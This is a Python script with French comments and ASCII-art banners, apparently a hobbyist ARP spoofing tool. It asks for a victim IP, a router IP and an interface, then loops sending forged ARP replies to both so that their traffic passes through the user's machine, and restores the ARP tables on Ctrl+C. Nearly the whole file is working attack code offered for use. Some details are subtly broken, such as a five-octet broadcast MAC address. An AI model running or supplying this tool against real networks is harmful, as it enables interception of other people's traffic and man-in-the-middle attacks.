# Importation des librairies
from socket import timeout
import scapy.all as scapy
import time
import argparse
import sys

# Boîte à outil
print("""
  _____                           __  __                      _   _           
 / ____|                         |  \/  |                    | | (_)           
| |     __ _  ___  ___  __ _ _ __| \  / | __ ___  _____ _ __ | |_ _ _   _ ___  
| |    / _` |/ _ \/ __|/ _` | '__| |\/| |/ _` \ \/ / _ \ '_ \| __| | | | / __| 
| |___| (_| |  __/\__ \ (_| | |  | |  | | (_| |>  <  __/ | | | |_| | |_| \__ \ 
 \_____\__,_|\___||___/\__,_|_|  |_|  |_|\__,_/_/\_\___|_| |_|\__|_|\__,_|___/ 
                                                                                
                                                                                
""")

# Fonction pour rechercher la MAC
def recherche_mac(targetIP, interface):
    pkt7 = scapy.Ether(dst="ff:ff:ff:ff:ff") / scapy.ARP(pdst=targetIP)
    ans = scapy.srp1(pkt7, iface=interface, timeout=2)
    if ans:
        mac = ans[0][1].hwsrc
        return str(mac)
    else:
        print("L'adresse MAC est inexistante")

# Fonction principale permettant de faire fonctionner tout le programme
def arpspoof():
    # Message de bienvenue
    print("***********************************************************************")
    print("**********Bienvenue sur le ARP Spoofer de CaesarMaxentius**********")
    print("***********************************************************************")

    # Définition de mes fonctions dynamiques permettant à l'utilisateur d'entrer lui-même ses caractères
    targetIP = input("Entrez l'adresse IP de la victime : ")
    spoofIP = input("Entrez l'adresse IP que vous voulez usurper : ")
    routeurIP = input("Entrez l'adresse IP du routeur : ")
    interface = input("Entrez votre interface ethernet : ")

    destinationIP = targetIP
    sourceIP = input("Entrez votre adresse IP (pour reset lorsque vous aurez terminé) : ")

    # Utilisation de la fonction recherche_mac avec les arguments nécessaires
    destinationMac = recherche_mac(targetIP, interface)

    # Message de lancement
    print(
        "##::::::::::'###::::'##::: ##::'######::'########:'##::::'##:'########:'##::: ##:'########::::\n"
        "##:::::::::'## ##::: ###:: ##:'##... ##: ##.....:: ###::'###: ##.....:: ###:: ##:... ##..:::::\n"
        "##::::::::'##:. ##:: ####: ##: ##:::..:: ##::::::: ####'####: ##::::::: ####: ##:::: ##:::::::\n"
        "##:::::::'##:::. ##: ## ## ##: ##::::::: ######::: ## ### ##: ######::: ## ## ##:::: ##:::::::\n"
        "##::::::: #########: ##. ####: ##::::::: ##...:::: ##. #: ##: ##...:::: ##. ####:::: ##:::::::\n"
        "##::::::: ##.... ##: ##:. ###: ##::: ##: ##::::::: ##:.:: ##: ##::::::: ##:. ###:::: ##:::::::\n"
        "########: ##:::: ##: ##::. ##:. ######:: ########: ##:::: ##: ########: ##::. ##:::: ##:::::::\n"
        "........::..:::::..::..::::..:::......:::........::..:::::..::........::..::::..:::::..:::::::\n"
    )

    def spoofer(targetIP, spoofIP):
        packet = scapy.ARP(op=2, pdst=targetIP, hwdst=destinationMac, psrc=spoofIP)
        scapy.send(packet, verbose=False)

    def restore(destinationIP, sourceIP):
        packet = scapy.ARP(op=2, pdst=destinationIP, hwdst=recherche_mac(destinationIP, interface), psrc=sourceIP)
        scapy.send(packet, count=4, verbose=False)

    packets = 0
    try:
        while True:
            spoofer(targetIP, routeurIP)
            spoofer(routeurIP, targetIP)
            print("\rCaesar HACKING : [+] Envoie de paquets " + str(packets)),
            sys.stdout.flush()
            packets += 2
            time.sleep(2)
    except KeyboardInterrupt:
        print("***********************************************************************")
        print("\nInterrompre le Spoof en faisant CTRL + C------------ Retour à l'état normal..")
        print("***********************************************************************")
        print(
            "\n   _____    ___.   .__               __          __   "
            "\n  /  _  \   \_ |__ |__| ____   _____/  |_  _____/  |_ "
            "\n /  /_\  \   | __ \|  |/ __ \ /    \   __\/  _ \   __\""
            "\n/    |    \  | \_\ \  \  ___/|   |  \  | (  <_> )  |  "
            "\n\____|__  /  |___  /__|\___  >___|  /__|  \____/|__|  "
            "\n        \/       \/        \/     \/                  "
        )
        print("***********************************************************************")
        restore(targetIP, routeurIP)
        restore(routeurIP, targetIP)

if __name__ == "__main__":
    arpspoof()
